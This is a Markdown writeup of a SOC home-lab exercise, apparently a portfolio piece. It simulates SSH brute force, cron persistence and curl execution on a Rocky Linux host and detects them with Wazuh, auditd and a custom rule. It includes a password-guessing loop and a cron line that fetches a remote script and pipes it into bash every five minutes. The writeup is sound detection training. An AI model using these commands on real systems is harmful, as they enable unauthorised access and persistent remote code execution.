@@ -1,0 +1,164 @@
+# Incident Simulation: Linux Attack Chain with Wazuh Detection
+
+A writeup from the same SOC home lab, covering the second monitored endpoint — a Linux host. It documents three attack techniques against Rocky Linux, their detection through `auditd`, `/var/log/secure`, and File Integrity Monitoring, a custom detection rule, and a full root-cause analysis of a real telemetry-delivery problem. Every technique is mapped to MITRE ATT&CK.
+
+> **Nature of this material:** a controlled simulation in an isolated lab. All actions were performed manually on a dedicated test machine using benign commands. The objective was to practise detection, analysis, and troubleshooting on Linux telemetry.
+
+---
+
+## 1. Lab environment
+
+| Component | Details |
+|---|---|
+| SIEM/XDR | Wazuh 4.14.7 (same all-in-one server as the Windows lab) |
+| Server | Ubuntu Server 22.04 LTS, 192.168.122.125 |
+| Monitored endpoint | Rocky Linux 9 (Minimal) |
+| Hostname / agent | rocky-agent / agent id 002 |
+| Endpoint telemetry | `auditd` (command execution), File Integrity Monitoring (syscheck), `/var/log/secure` |
+| Virtualisation | QEMU/KVM, isolated libvirt NAT 192.168.122.0/24 |
+
+**Telemetry configured for visibility:**
+- `auditd` installed and enabled, with custom watch rules on cron files and `execve` for selected binaries
+- FIM in real-time mode on `/etc`, `/usr/bin`, `/usr/sbin`, `/root`, `/home`, `/tmp`
+- Agent collecting `/var/log/secure` (authentication, sudo) and `/var/log/audit/audit.log`
+
+**Timeline note:** the Wazuh server runs in UTC while the Rocky host displays local time (CEST, +02:00). Event times should be read from the dashboard in UTC for consistency across sources — a practical reminder that mixed time zones make raw-log correlation error-prone (see Analyst findings).
+
+---
+
+## 2. Attack summary
+
+Rocky-family systems (RHEL/CentOS/Rocky) are the enterprise Linux most often seen in the field, which is why this endpoint uses `/var/log/secure`, `auditd`, and `firewalld` rather than a Debian-style layout.
+
+| # | Technique | ATT&CK | Data source | Detection |
+|---|---|---|---|---|
+| 1 | Brute Force (SSH) | T1110 | `/var/log/secure` | Built-in — two-level (single + aggregate) |
+| 2 | Scheduled Task/Job (cron) | T1053.003 | auditd / cron log | Built-in — "Crontab entry changed" |
+| 3 | Command & Scripting (Unix Shell) | T1059.004 | auditd `execve` | **Custom rule 100200** |
+
+---
+
+## 3. Attack-by-attack analysis
+
+### Attack 1 — Brute Force over SSH (T1110)
+
+**Action:** a burst of failed SSH logins against a non-existent account, simulating a password-guessing attack.
+
+```bash
+for i in $(seq 1 15); do
+  sshpass -p 'wrongpass' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 baduser@127.0.0.1 2>/dev/null
+done
+```
+
+**Detection — two levels:**
+- Individual events: `sshd: authentication failed` — each failed attempt logged separately (raw signal).
+- Aggregate event: `sshd: brute force trying to get access to the system` — Wazuh **correlated** the burst of failures within a time window and raised a single higher-severity alert mapped to T1110.
+
+**Key analyst finding:** the log also flagged attempts against a **non-existent user** (`baduser`). This is a meaningful signal — a legitimate user who forgot their password retries against *their own existing* account, whereas an automated brute-force tool sprays names from a wordlist, many of which don't exist. Attempts against non-existent accounts are therefore a strong indicator of an automated attack rather than user error, and one of the first things that separates a real attack from a false positive.
+
+**Concept demonstrated:** thresholds and correlation. A single failure is noise; a burst within a window is an attack. The SIEM aggregates many low-value events into one meaningful alert — this is why raising the alert level on the *aggregate*, not each attempt, keeps the queue readable.
+
+### Attack 2 — Persistence via cron (T1053.003)
+
+**Action:** a malicious cron entry that repeatedly downloads and executes a script — the Linux counterpart of the Windows scheduled task (T1053.005).
+
+```bash
+(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://192.168.122.125/x.sh | bash") | crontab -
+```
+
+An auditd watch was added on the cron files to ensure the change was captured:
+
+```bash
+sudo auditctl -w /var/spool/cron/ -p wa -k cron_change
+sudo auditctl -w /etc/crontab -p wa -k cron_change
+```
+
+**Detection:** `Crontab entry changed`.
+
+**Key analyst finding:** the raw cron log line — `crontab[PID]: (jakub) REPLACE (jakub)` — tells you *that* the crontab was replaced and *by whom*, but **not what was written**. To see the actual payload you must correlate with the auditd watch or read the crontab content directly. This is the recurring lesson of the whole lab: one source says "something changed," another says "here is exactly what." The `curl … | bash` pattern in a cron job — downloading remote code and piping it straight into a shell, on a schedule — is itself one of the strongest indicators of Linux compromise, because legitimate cron jobs rarely fetch and execute remote code on every run.
+
+### Attack 3 — Command execution / Unix Shell (T1059.004)
+
+**Action:** execution of a commonly abused download tool, captured by an auditd `execve` rule.
+
+```bash
+sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=$(which curl) -k suspicious_exec
+curl -s http://192.168.122.125/ -o /tmp/test
+```
+
+Using `$(which curl)` resolves the real binary path, avoiding the "No such file or directory" error that occurs when a hard-coded path (or a tool absent on a Minimal install, e.g. `nc`) doesn't exist.
+
+**Detection:** the default ruleset decoded the event correctly but classified it under rule **80700, level 0** ("Audit: Messages grouped") — meaning *recorded but no alert*. This is the same situation as certutil on Windows: telemetry works, data arrives, but no built-in rule treats it as significant. The fix was a **custom rule** (see section 4), verified with `wazuh-logtest`, which returned the rule firing at level 10 with `**Alert to be generated**` and the T1059.004 mapping.
+
+**Decoded fields of interest** (from `wazuh-logtest`): `audit.key`, `audit.command`, `audit.exe`, `audit.execve.a0..a4`, plus `auid` (the original login identity, preserved even across `su`/`sudo` — invaluable for attributing actions).
+
+---
+
+## 4. Custom detection rule (Linux)
+
+The second custom rule of the lab, mapped to T1059.004. It raises audited executions carrying the `suspicious_exec` key from the silent level 0 to an actionable alert.
+
+```xml
+<group name="audit,attack,custom,">
+  <rule id="100200" level="10">
+    <if_sid>80700</if_sid>
+    <field name="audit.key">suspicious_exec</field>
+    <description>Suspicious tool execution on Linux via audited binary (key: $(audit.key)) - MITRE T1059.004</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+  </rule>
+</group>
+```
+
+**Logic:** builds on rule 80700 (the grouped-auditd base), fires only when the event carries the `suspicious_exec` audit key, raises it to level 10, and maps it to T1059.004.
+
+**Verification:** validated with `wazuh-logtest` against a real `SYSCALL` line — a key detail, because auditd events span multiple lines (SYSCALL carries the key, EXECVE carries the arguments), and the rule condition (`audit.key`) is only present on the SYSCALL line. Testing the wrong line returns level 0 and looks like a failure when the rule is in fact correct.
+
+---
+
+## 5. Operational finding: auditd events not reaching the dashboard (root-cause analysis)
+
+The most instructive part of the Linux lab was a real telemetry-delivery failure: rule 100200 fired correctly in `wazuh-logtest`, `auditd` recorded the event locally (`ausearch` showed it), yet no alert appeared in the dashboard on live traffic. This was diagnosed by eliminating layers from source to destination:
+
+| Layer checked | Tool | Result |
+|---|---|---|
+| Detection rule | `wazuh-logtest` | Rule 100200 fires (level 10, T1059.004) — rule is correct |
+| Duplicate agent IDs | `manage_agents -l` | Clean — 001 windows, 002 rocky — not the cause |
+| Server resources | `free -h` | ~5 GB available — not the cause |
+| Clock sync | `timedatectl` | Both hosts in sync (2 s apart in UTC) — not the cause; the apparent 2 h gap was a UTC-vs-CEST display artefact |
+| Agent connectivity | agent `ossec.log` | Flapping "Lost connection" — traced to **our own manager restarts** during rule debugging, not a persistent fault |
+| Event in the monitored file | `grep audit.log` | **Empty** — the event was not in the file Wazuh reads |
+| auditd write config | `/etc/audit/auditd.conf` | `log_format = ENRICHED` — **root cause** |
+
+**Root cause:** `auditd` was writing in **ENRICHED** format. `ausearch` reads events through auditd's own interface (so it saw them), but the Wazuh decoder reads the plaintext `audit.log` and did not parse the ENRICHED entries — so from the SIEM's perspective the events did not exist. This is a common Rocky/RHEL 9 default.
+
+**Remediation attempted:** switch `log_format` to `RAW` and restart auditd (note: on RHEL, auditd is restarted with `service auditd restart`, not `systemctl`). At the time of writing, live delivery of `execve` events remained an open issue on this host, tracked for follow-up; local detection and rule logic are fully proven.
+
+**Why this matters:** "data not arriving" in a SIEM is almost never a single obvious cause. The correct response is layered elimination from source to destination — exactly the process above. The lesson: a rule that works in a test harness can still be invisible in production if the transport or the source format is wrong, and the analyst must be able to tell those apart.
+
+---
+
+## 6. Analyst findings
+
+1. **Correlation and thresholds.** A single failed login is noise; an aggregated burst is an attack. The SIEM raises severity on the aggregate, not each event.
+2. **Non-existent target accounts** in a brute force indicate automation, not user error — a fast true/false-positive discriminator.
+3. **One action, multiple traces** — the cron log shows *that* it changed and by whom; auditd/content shows *what*. Confidence comes from correlation.
+4. **`curl | bash` in cron** is a high-value Linux compromise indicator.
+5. **Detecting technique vs result** — the default ruleset left `execve` at level 0; a custom rule mapped to T1059.004 made it actionable.
+6. **Mixed time zones break raw-log correlation** — the server in UTC and the host in CEST produced an apparent 2-hour gap that was purely a display artefact. Standardising on UTC is the field practice.
+7. **Root-cause analysis from source to destination** — the ENRICHED-format finding was reached only by systematically ruling out rule, duplicates, resources, clock, and connectivity first.
+
+---
+
+## 7. Skills demonstrated
+
+- Onboarding and tuning a Linux endpoint into a SIEM (`auditd`, FIM, `/var/log/secure`)
+- Simulating and detecting Linux ATT&CK techniques (T1110, T1053.003, T1059.004)
+- Writing and validating a custom detection rule with `wazuh-logtest`, including understanding multi-line auditd event structure
+- End-to-end troubleshooting of a telemetry-delivery failure via layered root-cause analysis
+- Working knowledge of RHEL-family specifics (`service` vs `systemctl` for auditd, `secure` log, ENRICHED vs RAW audit format)
+
+---
+
+*Lab built as part of independent preparation for a SOC Analyst role. Isolated environment; all actions controlled and benign. Companion to the Windows attack-chain writeup in the same repository.*
